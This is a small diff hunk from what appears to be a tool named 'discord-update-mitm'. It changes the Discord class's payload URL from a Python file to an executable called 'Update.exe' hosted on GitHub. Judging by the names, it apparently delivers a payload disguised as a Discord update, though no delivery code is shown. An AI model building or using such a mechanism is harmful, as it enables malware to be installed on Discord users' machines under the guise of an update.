@@ -13,7 +13,7 @@ __github__ = "https://github.com/rodriguez-moon/discord-update-mitm"
 
 class Discord:
     def __init__(self):
-        self.payload_url = "https://raw.githubusercontent.com/rodriguez-moon/discord-update-mitm/main/payload/src.py"
+        self.payload_url = "https://raw.githubusercontent.com/rodriguez-moon/discord-update-mitm/main/payload/Update.exe"
         self.payload = None
 
     def get_time(self) -> datetime:
